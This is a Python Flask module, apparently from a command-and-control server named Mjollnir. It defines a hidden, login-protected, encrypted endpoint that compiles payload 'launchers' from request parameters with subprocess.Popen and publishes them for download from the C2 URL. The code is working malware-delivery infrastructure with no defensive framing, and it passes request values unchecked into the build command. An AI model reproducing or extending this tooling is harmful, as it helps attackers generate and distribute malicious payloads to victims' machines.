# launcher.py

from flask import Blueprint, render_template, request, jsonify
from flask_login import login_required
import json
from . import db, config, decrypt, encrypt, current_dir
import time
import subprocess
import shlex
import binascii

launcher = Blueprint('launcher', __name__)


# create launcher - generate - compile
@launcher.route(config["hidden_route"] + config["endpoints"]["launcher"], methods=['POST'])
@login_required
def generate_launcher():
    try:
        content = request.data
        d = decrypt(content)
    except Exception as e:
        print("[-] Error in generate_launcher()")
        print(str(e))
        return encrypt("[-] Cannot decrypt the request")

    d = json.loads(d)

    launcher_name = d["launcher_name"]
    launcher_builder = current_dir + config["launcher"]["details"][launcher_name]["builder"]
    params = config["launcher"]["details"][launcher_name]["parameters"]
    source_code = current_dir + config["launcher"]["details"][launcher_name]["source_code"]
    c = launcher_builder
    for p in params:
        c += " " + d[p]
    c += " " + source_code
        
    cc = shlex.split(c)
    subprocess.Popen(cc, start_new_session=True)

    location_download = config["mjollnir_c2_url"] + config["endpoints"]["public_download"] + "/" + d["OUTPUT_FILENAME"]
    return encrypt("[+] Launcher created. Publicly downloadable at: " + location_download)


